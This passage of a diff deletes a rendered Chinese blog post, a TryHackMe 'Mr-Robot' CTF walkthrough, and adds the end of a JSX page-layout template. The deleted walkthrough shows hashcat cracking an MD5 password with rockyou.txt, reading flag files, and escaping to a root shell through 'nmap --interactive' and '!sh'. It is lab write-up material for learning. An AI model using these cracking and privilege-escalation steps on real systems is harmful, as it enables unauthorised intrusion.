<span class="number">0</span>x0000ffff mask, <span class="number">262144</span> bytes, <span class="number">5</span>/<span class="number">13</span> rotates</span><br><span class="line">Rules: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero<span class="literal">-Byte</span></span><br><span class="line">* Early<span class="literal">-Skip</span></span><br><span class="line">* Not<span class="literal">-Salted</span></span><br><span class="line">* Not<span class="literal">-Iterated</span></span><br><span class="line">* Single<span class="literal">-Hash</span></span><br><span class="line">* Single<span class="literal">-Salt</span></span><br><span class="line">* Raw<span class="literal">-Hash</span></span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line"><span class="keyword">Using</span> pure kernels enables cracking longer passwords but for the price of drastically reduced performance.</span><br><span class="line"><span class="keyword">If</span> you want to <span class="keyword">switch</span> to optimized backend kernels, append <span class="literal">-O</span> to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: <span class="number">64</span> MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: <span class="number">14344392</span></span><br><span class="line">* Bytes.....: <span class="number">139921507</span></span><br><span class="line">* Keyspace..: <span class="number">14344385</span></span><br><span class="line">* Runtime...: <span class="number">2</span> secs</span><br><span class="line"></span><br><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: MD5</span><br><span class="line">Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b</span><br><span class="line">Time.Started.....: Thu Aug  <span class="number">3</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">25</span> <span class="number">2023</span>, (<span class="number">0</span> secs)</span><br><span class="line">Time.Estimated...: Thu Aug  <span class="number">3</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">25</span> <span class="number">2023</span>, (<span class="number">0</span> secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: <span class="number">1</span>/<span class="number">1</span> (<span class="number">100.00</span>%)</span><br><span class="line">Speed.<span class="comment">#1.........:   464.4 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: <span class="number">1</span>/<span class="number">1</span> (<span class="number">100.00</span>%) Digests</span><br><span class="line">Progress.........: <span class="number">40960</span>/<span class="number">14344385</span> (<span class="number">0.29</span>%)</span><br><span class="line">Rejected.........: <span class="number">0</span>/<span class="number">40960</span> (<span class="number">0.00</span>%)</span><br><span class="line">Restore.Point....: <span class="number">39936</span>/<span class="number">14344385</span> (<span class="number">0.28</span>%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#1....: promo2007 -&gt; loserface1</span></span><br><span class="line"></span><br><span class="line">Started: Thu Aug  <span class="number">3</span> <span class="number">14</span>:<span class="number">54</span>:<span class="number">49</span> <span class="number">2023</span></span><br><span class="line">Stopped: Thu Aug  <span class="number">3</span> <span class="number">14</span>:<span class="number">55</span>:<span class="number">27</span> <span class="number">2023</span></span><br></pre></td></tr></table></figure>
-
-<p>得到key2</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:/<span class="variable">$</span> <span class="built_in">cd</span> home/robot</span><br><span class="line"><span class="built_in">cd</span> home/robot</span><br><span class="line">robot@linux:~<span class="variable">$</span> <span class="built_in">ls</span>  </span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">key<span class="literal">-2-of-3</span>.txt  password.raw<span class="literal">-md5</span></span><br><span class="line">robot@linux:~<span class="variable">$</span> <span class="built_in">cat</span> key<span class="literal">-2-of-3</span>.txt</span><br><span class="line"><span class="built_in">cat</span> key<span class="literal">-2-of-3</span>.txt</span><br><span class="line"><span class="number">822</span>c73956184f694993bede3eb39f959</span><br><span class="line">robot@linux:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>
-
-<p>4.sudo提权</p>
-<p>官网提示nmap</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">robot@linux:/<span class="variable">$</span> nmap <span class="literal">--interactive</span></span><br><span class="line">nmap <span class="literal">--interactive</span></span><br><span class="line"></span><br><span class="line">Starting nmap V. <span class="number">3.81</span> ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode <span class="literal">--</span> press <span class="built_in">h</span> &lt;enter&gt; <span class="keyword">for</span> help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">firstboot_done  key<span class="literal">-3-of-3</span>.txt</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line"><span class="built_in">cat</span> key<span class="literal">-3-of-3</span>.txt</span><br><span class="line"><span class="number">04787</span>ddef27c3dee1ee161b21670b4e4</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/03/Mr-Robot-ctf/" data-id="clmnr8jzw0001so8ghccg51s0" data-title="Mr-Robot-ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/08/05/tomghost/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          tomghost
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/08/02/pickle-rick/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">pickle-rick</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/09/18/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2023/09/18/home/">home</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/19/venus/">venus</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/11/flower/">flower</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 honkerZ<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
+        return <html lang={language ? language.substr(0, 2) : ''}>
+            <Head site={site} config={config} helper={helper} page={page} />
+            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
+                <Navbar config={config} helper={helper} page={page} />
+                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
+                <section class="section">
+                    <div class="container">
+                        <div class="columns">
+                            <div class={classname({
+                                column: true,
+                                'order-2': true,
+                                'column-main': true,
+                                'is-12': columnCount === 1,
+                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
+                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
+                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
+                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
+                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
+                        </div>
+                    </div>
+                </section>
+                <Footer config={config} helper={helper} />
+                <Scripts site={site} config={config} helper={helper} page={page} />
+                <Search config={config} helper={helper} />
+                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
+                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
+                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
+            </body>
+        </html>;
+    }
+};
